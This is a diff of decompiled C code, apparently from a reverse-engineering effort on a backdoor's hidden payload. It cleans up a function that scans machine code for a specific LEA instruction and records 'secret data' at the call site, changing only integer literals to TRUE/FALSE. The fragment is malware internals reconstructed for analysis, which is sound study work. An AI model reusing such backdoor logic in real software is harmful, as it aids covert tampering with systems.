@@ -22,8 +22,8 @@ BOOL find_lea_instruction_with_mem_operand
   dasm_ctx_t local_80;
   
   bVar5 = 0;
-  BVar2 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x1c8,0,0x1e,0);
-  if (BVar2 != 0) {
+  BVar2 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x1c8,0,0x1e,FALSE);
+  if (BVar2 != FALSE) {
     pdVar4 = &local_80;
     for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
       *(undefined4 *)&pdVar4->instruction = 0;
@@ -34,7 +34,7 @@ BOOL find_lea_instruction_with_mem_operand
     }
     for (; code_start < code_end; code_start = code_start + 1) {
       BVar2 = x86_dasm(dctx,code_start,code_end);
-      if ((((BVar2 != 0) &&
+      if ((((BVar2 != FALSE) &&
            (iVar1._0_1_ = dctx->_unknown810[0], iVar1._1_1_ = dctx->_unknown810[1],
            iVar1._2_1_ = dctx->_unknown810[2], iVar1._3_1_ = dctx->field_0x2b, iVar1 == 0x10d)) &&
           (((dctx->field2_0x10).field0.field10_0xb.rex_byte & 0x48) == 0x48)) &&
@@ -42,10 +42,10 @@ BOOL find_lea_instruction_with_mem_operand
           ((mem_address == (void *)0x0 ||
            (dctx->instruction + *(long *)dctx->_unknown812 + dctx->instruction_size ==
             (u8 *)mem_address)))))) {
-        return 1;
+        return TRUE;
       }
     }
   }
-  return 0;
+  return FALSE;
 }
 
